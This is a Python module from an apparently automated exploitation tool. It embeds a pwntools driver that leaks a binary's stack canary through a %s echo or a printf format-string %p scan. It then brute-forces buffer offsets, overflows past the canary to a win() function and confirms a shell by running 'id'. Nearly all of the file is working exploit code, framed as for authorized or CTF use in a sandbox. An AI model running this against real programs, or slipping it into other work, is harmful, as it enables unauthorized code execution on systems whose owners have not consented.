"""Stack-canary bypass via leak, verified by execution.

A stack canary stops a linear overflow (it is checked before `ret`), UNLESS the program also
leaks the canary. Two leak shapes are tried, both verified by getting a shell:

  Strategy A -- `%s`-echo leak: a buffer printed with `%s` right after a read that can overwrite
  the canary's null least-significant byte. Overwriting that 0x00 makes `%s` keep going and print
  the upper 7 canary bytes; we recover `canary = 0x00 | leaked7`.

  Strategy B -- format-string leak (the most common real-world shape): the program does
  `printf(user_input)`, so a positional `%p` scan prints stack slots. We pick the canary-like
  value (low byte 0x00, enough entropy, not an obvious code/stack/libc pointer).

Either way, a second overflow in the SAME process (the canary is re-randomized per exec, even
with ASLR off) rewrites the SAME canary value in place and continues past it to `win()`. For
AUTHORIZED / CTF only. Runs in the shared sandbox (Docker image or native fallback)."""
from __future__ import annotations

from ._sandbox import run_driver

_DRIVER = r'''
import sys
from subprocess import STDOUT
from pwn import *
elf = ELF(sys.argv[1], checksec=False); context.binary = elf; context.log_level = "error"
context.timeout = 3
win = (elf.symbols or {}).get("win")
if not win:
    print("NO_WIN"); sys.exit(1)
try:
    ret = ROP(elf).find_gadget(["ret"]).address      # for stack alignment before win()->system()
except Exception:
    ret = None
MARK = b"BINORACLE_PWNED"

# buf-to-canary distance (buffer size); the canary sits right after the buffer. For each, try the
# saved-rbp gap (usually 8) and whether a `ret` alignment slot before win() is needed (system()'s
# movaps requires a 16-aligned stack). A leak that overwrites the canary's null LSB is what lets
# the %s print the upper 7 canary bytes; if the read is too short to reach the LSB, no leak.
for bufsz in (72, 64, 56, 88, 40, 48, 80, 96, 104, 112, 120, 128, 32):
    for rbpgap in (8, 0, 16):
        for align in ((ret,) if ret else (None,)) + ((None,) if ret else ()):
            io = None
            try:
                io = process([elf.path], aslr=False, stderr=STDOUT)
                # Stage 1 -- leak: overwrite ONLY the canary's null LSB with a non-zero byte so the
                # following %s keeps going into the upper 7 canary bytes.
                io.send(b"A" * bufsz + b"B")
                try:
                    # 2s -> 4s: real CI flake seen once under concurrent-run resource contention
                    # (3 CI runs triggered back to back landed on the shared runner pool at once)
                    # -- this exact test passed in every prior/later run and 3/3 locally, so the
                    # logic itself is sound; the margin on a real subprocess I/O read just wasn't
                    # generous enough for a loaded box. Still well under the 78-attempt sweep's
                    # total budget even in the worst case (every bufsz/rbpgap/align combo missing).
                    io.recvuntil(b"B", timeout=4)            # up to the LSB byte we planted
                    leaked = io.recv(7, timeout=4)           # the 7 upper canary bytes
                except Exception:
                    leaked = b""
                if len(leaked) < 7:
                    io.close(); continue
                canary = u64(b"\x00" + leaked)               # glibc canary LSB is always 0x00
                if canary == 0 or (canary & 0xff) != 0:
                    io.close(); continue
                try:
                    io.recvrepeat(0.3)                       # drain to the next (overflow) read
                except Exception:
                    pass
                # Stage 2 -- rewrite the SAME canary (check passes), saved rbp padding, optional
                # ret for alignment, then the return address = win().
                tail = (p64(align) if align else b"") + p64(win)
                io.send(b"A" * bufsz + p64(canary) + b"A" * rbpgap + tail)
                dbg = b""
                try:
                    dbg += io.recvrepeat(1.0)
                except Exception:
                    pass
                io.sendline(b"echo " + MARK + b"; id")
                try:
                    dbg += io.recvrepeat(1.5)
                except Exception:
                    pass
                io.close()
                if MARK in dbg or b"uid=" in dbg or b"win" in dbg:
                    print("VERIFIED bufsz=%d rbpgap=%d align=%s canary=%#x win=%#x"
                          % (bufsz, rbpgap, "ret" if align else "none", canary, win))
                    sys.exit(0)
            except Exception:
                try:
                    if io: io.close()
                except Exception:
                    pass

# Strategy B -- FORMAT-STRING canary leak (the most common real-world shape): the program does
# printf(user_input), so a positional scan (%p...) prints stack slots, among them the canary.
# The canary and the overflow MUST happen in the SAME process (the canary is re-randomized per
# exec even with ASLR off), so each attempt re-leaks and then overflows in one process. The
# positional INDEX of the canary is stable across runs, so `rank` selects the k-th canary-like
# value (low byte 0x00, not an obvious code/stack/libc pointer) consistently.
import re as _re
def _canary_like(toks):
    out = []
    for t in toks:
        try:
            v = int(t, 16)
        except Exception:
            continue
        if (v & 0xff) != 0 or v < 0x100000000:
            continue                                   # canary LSB is 0x00; skip small/flat-binary values
        if (v & 0xffffff00) == 0:
            continue                                   # skip byte<<N artifacts (e.g. 0xb500000000): a real canary's low bytes are random
        if (v >> 40) in (0x55, 0x56, 0x7e, 0x7f) or (v >> 44) == 0x7:
            continue                                   # skip PIE/stack/libc pointers
        if v not in out:
            out.append(v)
    return out
SCAN = b"%p." * 60 + b"\n"      # sequential scan; 180B stays within typical input buffers
def _fmt_leaks():
    # ONE cheap scan: does this binary leak a canary-like value via printf(input)? If not, the
    # whole fmt brute-force below (up to 5*18*3*2 process spawns) is pointless -- skip it. This
    # keeps autocanary fast as a backstop on binaries with no format-string leak at all.
    io = None
    try:
        io = process([elf.path], aslr=False, stderr=STDOUT)
        io.send(SCAN)
        try:
            out = io.recvrepeat(0.6)
        except Exception:
            out = b""
        io.close()
        return bool(_canary_like(_re.findall(rb"0x[0-9a-fA-F]+", out)))
    except Exception:
        try:
            if io: io.close()
        except Exception:
            pass
        return False
_has_fmt = _fmt_leaks()
for rank in range(5 if _has_fmt else 0):
    for bufsz in (72, 64, 56, 88, 40, 48, 80, 96, 104, 120, 264, 256, 272, 280, 136, 152, 168, 200):
        for rbpgap in (8, 0, 16):
            for align in ((ret,) if ret else (None,)) + ((None,) if ret else ()):
                io = None
                try:
                    io = process([elf.path], aslr=False, stderr=STDOUT)
                    io.send(SCAN)
                    try:
                        out = io.recvrepeat(0.6)
                    except Exception:
                        out = b""
                    cands = _canary_like(_re.findall(rb"0x[0-9a-fA-F]+", out))
                    if len(cands) <= rank:
                        io.close(); continue
                    canary = cands[rank]
                    tail = (p64(align) if align else b"") + p64(win)
                    io.send(b"A" * bufsz + p64(canary) + b"A" * rbpgap + tail)
                    dbg = b""
                    try:
                        dbg += io.recvrepeat(1.0)
                    except Exception:
                        pass
                    io.sendline(b"echo " + MARK + b"; id")
                    try:
                        dbg += io.recvrepeat(1.5)
                    except Exception:
                        pass
                    io.close()
                    if MARK in dbg or b"uid=" in dbg:
                        print("VERIFIED(fmt) bufsz=%d rbpgap=%d align=%s canary=%#x win=%#x rank=%d"
                              % (bufsz, rbpgap, "ret" if align else "none", canary, win, rank))
                        sys.exit(0)
                except Exception:
                    try:
                        if io: io.close()
                    except Exception:
                        pass
print("NOT_VERIFIED")
sys.exit(1)
'''


def autocanary(binary: str) -> dict:
    """Leak the stack canary and overflow past it to win(), verified by execution. Needs a `win`
    gift and a leak primitive (a `%s`/echo of the overflowable buffer). Docker image or native
    sandbox; degrades cleanly otherwise."""
    res = run_driver(binary, _DRIVER, ".binoracle_canary.py")
    if not res.get("ok"):
        return res
    eng = res.get("engine", "sandbox")
    res["note"] = (f"canary leak -> overflow -> win (verificado por ejecucion, {eng})"
                   if res.get("verified")
                   else f"no verificado ({eng}): sin fuga del canary utilizable o sin win")
    return res


def render_canary(r: dict) -> str:
    out = ["## Bypass de stack canary (fuga + overflow, verificado)\n"]
    if not r.get("ok"):
        return "\n".join(out + ["No disponible: " + r.get("note", "")])
    out.append(f"- shell verificada: **{'SI' if r.get('verified') else 'no'}**")
    if r.get("detail"):
        out.append(f"- `{r['detail']}`")
    out.append("- " + r.get("note", ""))
    return "\n".join(out)
